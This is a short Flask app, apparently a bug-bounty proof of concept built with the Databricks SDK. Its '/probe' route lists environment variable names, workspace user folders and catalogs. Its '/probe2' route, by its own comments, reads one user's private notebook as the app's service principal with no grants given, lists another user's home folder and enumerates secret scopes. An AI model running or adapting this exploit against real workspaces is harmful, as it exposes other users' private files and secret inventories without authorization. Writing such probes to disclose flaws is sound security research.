
import os
from databricks.sdk import WorkspaceClient
from flask import Flask, jsonify
app = Flask(__name__)

@app.route("/")
def home():
    return "h3-app ok"

@app.route("/probe")
def probe():
    out = {"env_keys": sorted(os.environ.keys())}
    try:
        w = WorkspaceClient()
        me = w.current_user.me()
        out["identity"] = {"user": me.user_name, "id": me.id}
        out["ws_users"] = [o.path for o in w.workspace.list("/Users")][:30]
        out["catalogs"] = [c.name for c in w.catalogs.list()]
    except Exception as e:
        out["sdk_err"] = str(e)[:200]
    return jsonify(out)

@app.route("/probe2")
def probe2():
    w = WorkspaceClient()
    out = {}
    # 1. read user1 PRIVATE notebook as the app SP (no grants given)
    try:
        c = w.workspace.export("/Users/m4tr1x4g3nt47+user1@wearehackerone.com/h3_priv_nb", format="SOURCE")
        import base64 as b64
        txt = b64.b64decode(c.content).decode("utf-8", "replace")
        out["own_priv_read"] = {"ok": True, "contains_marker": "H3-APPSP-READ" in txt, "len": len(txt)}
    except Exception as e:
        out["own_priv_read"] = {"ok": False, "err": str(e)[:180]}
    # 2. list another user home (names only)
    try:
        out["other_home_list"] = [o.path for o in w.workspace.list("/Users/ram_rattle+user1@wearehackerone.com")][:15]
    except Exception as e:
        out["other_home_list_err"] = str(e)[:150]
    # 3. secrets scopes as SP
    try:
        out["secret_scopes"] = [s.name for s in w.secrets.list_scopes()]
    except Exception as e:
        out["secret_scopes_err"] = str(e)[:150]
    return jsonify(out)
